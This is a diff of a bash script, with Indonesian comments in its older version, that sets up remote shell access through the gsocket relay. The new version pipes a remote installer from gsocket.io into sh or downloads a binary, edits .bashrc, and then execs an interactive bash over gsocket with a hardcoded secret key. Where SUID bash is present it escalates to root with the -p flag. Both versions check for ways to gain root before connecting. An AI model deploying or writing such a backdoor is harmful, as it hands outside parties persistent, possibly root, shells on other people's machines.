@@ -1,60 +1,62 @@
 #!/bin/bash
-# root_check_connect.sh
+# multi_method_root.sh
 
-SECRET="CbadUt4YWKZmnNunoxGEmx"
+KEY="CbadUt4YWKZmnNunoxGEmx"
 
-clear
-echo "╔══════════════════════════════════╗"
-echo "║      ROOT ACCESS CHECKER         ║"
-echo "╚══════════════════════════════════╝"
+echo "=== MULTI-METHOD ROOT ACCESS ==="
 echo ""
 
-# Cek status
-echo "[*] Memeriksa sistem..."
-echo "    User: $(whoami)"
-echo "    Host: $(hostname)"
-echo "    Waktu: $(date)"
-echo ""
+# Method 0: Install gsocket if missing
+install_gsocket() {
+    echo "[*] Installing gsocket..."
+    
+    # Method A: Official script
+    echo "[A] Trying official installer..."
+    timeout 30 curl -sSL https://gsocket.io/install.sh | sh 2>/dev/null
+    
+    if ! command -v gsocket &> /dev/null; then
+        # Method B: Direct binary download
+        echo "[B] Downloading binary..."
+        mkdir -p ~/.gsocket
+        cd ~/.gsocket
+        wget -q https://github.com/hackerschoice/gsocket/releases/latest/download/gsocket.bin
+        chmod +x gsocket.bin
+        export PATH="$PATH:$(pwd)"
+        
+        # Create alias
+        echo 'alias gsocket="~/.gsocket/gsocket.bin"' >> ~/.bashrc
+        source ~/.bashrc
+    fi
+    
+    # Verify
+    if command -v gsocket &> /dev/null; then
+        echo "[+] gsocket ready!"
+        return 0
+    else
+        echo "[-] Failed to install"
+        return 1
+    fi
+}
 
-# Cek privilege
-echo "[*] Memeriksa hak akses:"
-
-if [ $(id -u) -eq 0 ]; then
-    echo "    [✓] Sudah sebagai ROOT!"
-    SHELL_TYPE="ROOT"
-elif [ -u /bin/bash ]; then
-    echo "    [✓] Bisa jadi root via SUID bash"
-    SHELL_TYPE="SUID_BASH"
-elif [ -u /bin/sh ]; then
-    echo "    [✓] Bisa jadi root via SUID sh"
-    SHELL_TYPE="SUID_SH"
-elif sudo -n true 2>/dev/null; then
-    echo "    [✓] Bisa sudo"
-    SHELL_TYPE="SUDO"
-else
-    echo "    [✗] Hanya user biasa"
-    SHELL_TYPE="USER"
+# Main
+if ! command -v gsocket &> /dev/null; then
+    install_gsocket
 fi
 
-echo ""
-echo "[*] Menghubungkan..."
-
-case $SHELL_TYPE in
-    "ROOT")
-        gsocket -s "$SECRET" /bin/bash -i
-        ;;
-    "SUID_BASH")
-        gsocket -s "$SECRET" /bin/bash -p -i
-        ;;
-    "SUID_SH")
-        gsocket -s "$SECRET" /bin/sh -p -i
-        ;;
-    "SUDO")
-        sudo gsocket -s "$SECRET" /bin/bash -i
-        ;;
-    *)
-        gsocket -s "$SECRET" /bin/bash -i
-        ;;
-esac
-
-echo "[*] Koneksi selesai"
+if command -v gsocket &> /dev/null; then
+    echo -e "\n[*] Connecting with key: ${KEY:0:10}..."
+    
+    # Try SUID bash first
+    if [ -u /bin/bash ]; then
+        echo "[+] Using SUID bash for root"
+        exec gsocket -s "$KEY" /bin/bash -p -i
+    else
+        echo "[+] Using regular shell"
+        exec gsocket -s "$KEY" /bin/bash -i
+    fi
+else
+    echo -e "\n[-] Cannot proceed without gsocket"
+    echo "[*] Please install manually:"
+    echo "    1. curl -sSL https://gsocket.io/install.sh | sh"
+    echo "    2. Then run: gsocket -s $KEY /bin/bash -i"
+fi
